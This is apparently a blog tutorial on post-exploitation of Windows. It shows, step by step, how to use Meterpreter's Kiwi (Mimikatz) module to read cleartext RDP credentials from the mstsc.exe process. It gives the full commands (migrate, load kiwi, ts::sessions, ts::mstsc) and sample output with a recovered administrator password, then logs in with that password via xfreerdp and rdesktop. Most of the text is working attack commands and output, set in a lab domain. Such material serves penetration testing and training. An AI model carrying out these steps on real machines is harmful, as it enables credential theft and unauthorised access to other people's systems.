---
layout: post
title: "Dumping RDP Credentials For Logged In User"
date: "2022-02-28"
description: "Dumping RDP Credentials For Logged In User"
coverimage: Dumping_RDP_Credentials_For_Logged_In_User.jpg
tags: 
published: true
posttype: article
categories: tutorial
---
In this tutorial, we will assume you have a Meterpreter Shell On a Windows Box

Migrate current process into `explorer.exe`
```
migrate -N explorer.exe
```

Take a look at the systems running processes. Here we are looking for  `mstsc.exe`. The `mstsc.exe` 

"Creates connections to Remove Desktop Session Host Servers of other remote computers."

Source:
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc

Now we load the Kiwi Module in Meterpreter
```
load kiwi
```

Now we want to look if there are any active sessions running using the kiwi module
```
kiwi_cmd ts::sessions
```

Example output below. Here we can see one active Administrator from the marvel domain. 
```

Session: 0 - Services
  state: Disconnected (4)
  user :  @ 
  curr : 2/28/2022 12:16:21 AM
  lock : no

Session: *1 - Console
  state: Active (0)
  user : Administrator @ MARVEL
  Conn : 2/27/2022 11:08:55 PM
  logon: 2/27/2022 11:09:03 PM
  curr : 2/28/2022 12:16:21 AM
  lock : no

Session: 65536 - RDP-Tcp
  state: Listen (6)
  user :  @ 
  lock : no
```

Attempt to drop clear text credentials. 
```
kiwi_cmd ts::mstsc
```

Example output
```
ServerName                                [wstring] '10.10.10.250'
ServerFqdn                                [wstring] ''
UserSpecifiedServerName                   [wstring] '10.10.10.250'
UserName                                  [wstring] 'Administrator'
Domain                                    [wstring] 'MARVEL'
Password                                  [protect] 'Passw0rd!'
SmartCardReaderName                       [wstring] ''
PasswordContainsSCardPin                  [ bool  ] FALSE
ServerNameUsedForAuthentication           [wstring] '10.10.10.250'
RDmiUsername                              [wstring] ''
```

Now RDP into the box. 
```
xfreerdp /u:Administrator /p:Passw0rd! /v:10.10.10.250
rdesktop -u Administrator -p Passw0rd! 10.10.10.250
```